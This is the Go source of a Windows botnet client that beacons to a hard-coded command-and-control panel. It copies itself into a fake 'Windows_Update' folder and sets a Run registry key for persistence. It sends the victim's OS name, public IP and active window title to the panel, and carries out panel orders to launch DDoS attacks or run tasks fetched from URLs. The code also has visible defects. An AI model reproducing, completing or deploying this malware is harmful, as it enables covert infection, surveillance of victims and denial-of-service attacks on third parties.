package main

import (
	"bytes"
	"fmt"
	"golang.org/x/sys/windows/registry"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"syscall"
	"time"
	"utils"
)

func main() {
	panel := "https://buntu.ga"
	username := "godbuntu"
	startup := true

	if startup {
		resp, err := http.Get(panel + "/status/" + username)
		if err != nil {
			log.Fatal(err)
		}
		defer resp.Body.Close()
		data, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			log.Fatal(err)
		}
		if string(data) == "vip" {
			InstallAVBypass()
		} else {
			Install()
		}
	}
	
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows NT\CurrentVersion`, registry.QUERY_VALUE)
	if err != nil {
		log.Fatal(err)
	}
	defer k.Close()
	os , _, err := k.GetStringValue("ProductName")
	if err != nil {
		log.Fatal(err)
	}

	resp, err := http.Get("https://api.myip.com")
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()
	data, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatal(err)
	}
	dataParsed := string(data)
	ip := strings.Split(strings.Split(dataParsed, ":")[1], "\"")[1]

	var currentTask string
	client := &http.Client{}
	for {
		if hwnd := getWindow("GetForegroundWindow") ; hwnd != 0 {
			text := GetWindowText(HWND(hwnd))
			currentTask = text
		}
		reqData := url.Values{"username": {username}, "os": {os}, "ip": {ip}, "currentTask": {currentTask}}
		req, err := http.NewRequest("POST", panel + "/docking", bytes.NewBufferString(reqData.Encode()))
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded; param=value")
		req.Header.Set("User-Agent", "Mozilla/5.0 (X11; U; Linux armv7l like Android; en-us) AppleWebKit/531.2+ (KHTML, like Gecko) Version/5.0 Safari/533.2+ Kindle/3.0+")

		resp, err := client.Do(req)
		if err != nil {
			log.Fatal(err)
		}
		defer resp.Body.Close()
		bytes, _ := ioutil.ReadAll(resp.Body)
		str := string(bytes)
		parseStr(str)
		fmt.Println(str)

		resp, err = http.Get(panel + "/interval/" + username)
		if err != nil {
			log.Fatal(err)
		}
		defer resp.Body.Close()
		data, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			log.Fatal(err)
		}
		sec, _ := strconv.Atoi(string(data))
		time.Sleep(time.Second * time.Duration(sec - 1))
	}
}

func run(cmd string) {
	c := exec.Command("cmd", "/C", cmd)
	c.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	_ = c.Run()
}

func Install() {
	if !(strings.Contains(os.Args[0], "winupdt.exe")) {
		run("mkdir %APPDATA%\\Windows_Update")
		run("copy " + os.Args[0] + " %APPDATA%\\Windows_Update\\winupdt.exe")
		run("REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V Windows_Update /t REG_SZ /F /D %APPDATA%\\Windows_Update\\winupdt.exe")
	}
}

func InstallAVBypass() {
	if !(strings.Contains(os.Args[0], "winupdt.exe")) {
		run("mkdir %APPDATA%\\Windows_Update")
		run("copy " + os.Args[0] + " %APPDATA%\\Windows_Update\\winupdt.exe")
		run("REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V Windows_Update /t REG_SZ /F /D %APPDATA%\\Windows_Update\\winupdt.exe")
	}
}

func addStartup(filename string) {
	rndStr := utils.RandomString(8, true)
	run("mkdir %APPDATA%\\Windows_Update")
	run("copy " + filename + " %APPDATA%\\Windows_Update\\" + rndStr + ".exe")
	run("REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V Windows_Update /t REG_SZ /F /D %APPDATA%\\Windows_Update\\" + rndStr + ".exe")
}

func addStartupAVBypass(filename string) {

}

func parseStr(str string) {
	if strings.Contains(str, "*") {
		splited := strings.Split(str, "*")
		for _, data := range splited {
			if strings.Count(data, ";") == 2 && strings.Count(data, "|") == 2 {
				taskType, _ := strconv.Atoi(strings.Split(data, "|")[1])
				param := strings.Split(data, "|")[2]
				parsedParam := strings.Split(param, ";")
				switch taskType {
				case 5:
					thread, _ := strconv.Atoi(parsedParam[1])
					time, _ := strconv.Atoi(parsedParam[2])
					utils.DDosAttc("3", parsedParam[0], thread, 10, time)
				case 6:
					thread, _ := strconv.Atoi(parsedParam[1])
					time, _ := strconv.Atoi(parsedParam[2])
					utils.DDosAttc("4", parsedParam[0], thread, 10, time)
				case 7:
					thread, _ := strconv.Atoi(parsedParam[1])
					time, _ := strconv.Atoi(parsedParam[2])
					utils.DDosAttc("0", parsedParam[0], thread, 10, time)
				case 8:
					thread, _ := strconv.Atoi(parsedParam[1])
					time, _ := strconv.Atoi(parsedParam[2])
					utils.DDosAttc("6", parsedParam[0], thread, 10, time)
				case 9:
					thread, _ := strconv.Atoi(parsedParam[1])
					time, _ := strconv.Atoi(parsedParam[2])
					utils.DDosAttc("5", parsedParam[0], thread, 10, time)
				case 10:
					thread, _ := strconv.Atoi(parsedParam[1])
					time, _ := strconv.Atoi(parsedParam[2])
					utils.DDosAttc("1", parsedParam[0], thread, 10, time)
				case 11:
					thread, _ := strconv.Atoi(parsedParam[1])
					time, _ := strconv.Atoi(parsedParam[2])
					utils.DDosAttc("2", parsedParam[0], thread, 10, time)
				}
			} else if strings.Count(str, ";") == 0 && strings.Count(str, "|") == 2 {
				taskType, _ := strconv.Atoi(strings.Split(data, "|")[1])
				url := strings.Split(data, "|")[2]
				ExecTask(taskType, url)
			}
		}
	} else {
		if strings.Count(str, ";") == 2 && strings.Count(str, "|") == 2 {
			taskType, _ := strconv.Atoi(strings.Split(str, "|")[1])
			param := strings.Split(str, "|")[2]
			parsedParam := strings.Split(param, ";")
			switch taskType {
			case 5:
				thread, _ := strconv.Atoi(parsedParam[1])
				time, _ := strconv.Atoi(parsedParam[2])
				utils.DDosAttc("3", parsedParam[0], thread, 10, time)
			case 6:
				thread, _ := strconv.Atoi(parsedParam[1])
				time, _ := strconv.Atoi(parsedParam[2])
				utils.DDosAttc("4", parsedParam[0], thread, 10, time)
			case 7:
				thread, _ := strconv.Atoi(parsedParam[1])
				time, _ := strconv.Atoi(parsedParam[2])
				utils.DDosAttc("0", parsedParam[0], thread, 10, time)
			case 8:
				thread, _ := strconv.Atoi(parsedParam[1])
				time, _ := strconv.Atoi(parsedParam[2])
				utils.DDosAttc("6", parsedParam[0], thread, 10, time)
			case 9:
				thread, _ := strconv.Atoi(parsedParam[1])
				time, _ := strconv.Atoi(parsedParam[2])
				utils.DDosAttc("5", parsedParam[0], thread, 10, time)
			case 10:
				thread, _ := strconv.Atoi(parsedParam[1])
				time, _ := strconv.Atoi(parsedParam[2])
				utils.DDosAttc("1", parsedParam[0], thread, 10, time)
			case 11:
				thread, _ := strconv.Atoi(parsedParam[1])
				time, _ := strconv.Atoi(parsedParam[2])
				utils.DDosAttc("2", parsedParam[0], thread, 10, time)
			}
		} else if strings.Count(str, ";") == 0 && strings.Count(str, "|") == 2 {
			taskType, _ := strconv.Atoi(strings.Split(str, "|")[1])
			url := strings.Split(str, "|")[2]
			ExecTask(taskType, url)
		}
	}
}
